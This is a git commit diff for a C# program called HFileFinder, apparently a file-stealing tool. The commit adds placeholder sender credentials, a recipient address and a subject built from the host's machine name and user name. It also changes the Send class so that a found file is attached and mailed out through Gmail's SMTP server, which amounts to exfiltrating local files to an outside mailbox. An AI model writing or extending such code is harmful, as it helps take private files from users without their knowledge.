f01f7fd6f759f149d44e943613a6663926061383
Hadi Bagheri <153322772+HadiBagheri9@users.noreply.github.com>
2024-07-22 15:08:52 +0330

    Add variables

--- HFileFinder/Program.cs
+++ HFileFinder/Program.cs
@@ -1,13 +1,16 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace HFileFinder
 {
     class Program
     {
+        private string email = "email";
+        private string password = "password";
+        private string to = "to";
+        private string displayName = "HFileFinder";
+        private string subject = Environment.MachineName + "/" + Environment.UserName + " : ";
+        private string body = "";
+
         static void Main(string[] args)
         {
             FileFinder.Main();
--- HFileFinder/Send.cs
+++ HFileFinder/Send.cs
@@ -5,15 +5,15 @@ namespace HFileFinder
 {
     class Send
     {
-        public static bool SendEmail(string from, string password, string displayName, string to, string subject, string body)
+        public static bool SendEmail(string from, string password, string displayName, string to, string subject, string body, string fileToAttach)
         {
             bool flag = true;
             MailMessage mail = new MailMessage();
             mail.From = new MailAddress(from, displayName);
             mail.To.Add(to);
             mail.Subject = subject;
-            //mail.Body = body;
-            mail.Attachments.Add(new Attachment(body));
+            mail.Body = body;
+            mail.Attachments.Add(new Attachment(fileToAttach));
             mail.IsBodyHtml = true;
 
             SmtpClient smtp = new SmtpClient("smtp.gmail.com");
